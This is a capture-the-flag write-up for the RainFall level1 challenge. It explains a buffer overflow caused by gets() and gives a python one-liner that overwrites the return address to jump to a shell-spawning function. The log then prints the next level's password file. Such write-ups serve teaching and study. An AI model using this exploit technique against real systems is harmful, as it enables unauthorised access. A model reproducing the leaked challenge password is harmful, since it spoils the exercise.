By doing a `objdump -D level1` we can notice that the code of the binary contains 2 functions : "main" and "run". It also calls many functions, including `gets` function. The gets() function reads bytes from the standard input stream, until a newline is read or an end-of-file condition is encountered. 

From `gets` man page, we can notice that it has a security problem : 
```
BUGS
       Never use gets().  Because it is impossible to tell without knowing the
       data  in  advance  how  many  characters  gets() will read, and because
       gets() will continue to store characters past the end of the buffer, it
       is  extremely dangerous to use.  It has been used to break computer se‐
       curity.  Use fgets() instead.
```

The use of `gets` is discouraged because it can allow bufferoverflow to happen.

What we do is overflow the 76 characters, and then write in little endian the address of the `run` function, which will allow us to go into a new shell.

> level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"' ; cat) | ./level1   
> Good... Wait what?

>cd /home/user/level2   
>cat .pass   
>53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

# Sources :

About `gets` function : 
- https://pubs.opengroup.org/onlinepubs/009695399/functions/gets.html
- https://stackoverflow.com/questions/4346598/gets-function-in-c

About bufferoverflows and how to exploit them : 
- https://www.kali-linux.fr/hacking/overflow-comment-ca-marche
- https://www.kali-linux.fr/hacking/overflows-passons-a-la-pratique


Assembly basics :
- https://beta.hackndo.com/assembly-basics/